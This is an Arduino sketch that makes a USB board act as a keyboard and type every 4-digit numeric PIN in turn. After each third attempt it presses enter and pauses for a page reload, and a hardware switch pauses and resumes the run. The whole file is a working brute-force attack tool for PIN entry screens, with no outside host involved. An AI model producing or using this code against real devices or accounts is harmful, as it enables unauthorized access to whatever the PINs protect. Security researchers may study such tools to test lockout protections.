
#include "Keyboard.h"

//we are using pin 9 for the switch input
int switchPin = 9;
int switchstate = 0;

char charset_main[] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9'};

int len = sizeof(charset_main)/sizeof(char);

int count = 0;


void bruteforce(char charset[], String prev, int len, int n){  
    while(digitalRead(switchPin) == LOW){
        //pause exeuction while switch is off
        //after turning the switch on, it will resume from where it left off
    }
    // check if n == 0
    if (n == 0){
        //Keyboard.println will also enter the value after typing the string out
        Keyboard.println(prev);
        count++;
        if(count==3){
          //after third attempt, press enter
          Keyboard.println();
          //reset the counter
          count = 0;
          //wait 1 second for page to reload
          delay(1000);
        }
        delay(100);
        return;
    }
    //for each character in charset
    int i;
    for (i = 0; i < len; i++){
        //convert previous charset to String
        String newprev = prev + charset[i];
        // decrement n and recursively call bruteforce
        bruteforce(charset, newprev, len, n - 1);
    }
}

void setup() {
  // put your setup code here, to run once:
  Keyboard.begin();

  //setup pin 9 as input
  pinMode(switchPin, INPUT);
}

void loop() {
  //check the state of pin 9, whether it is HIGH (on) or LOW (off)
  switchstate = digitalRead(switchPin);

  if (switchstate == HIGH){
    //n is the length of the password
    int n = 4;
    bruteforce(charset_main, "", len, n);
  
  } else if (switchstate == LOW){

  }
  
}
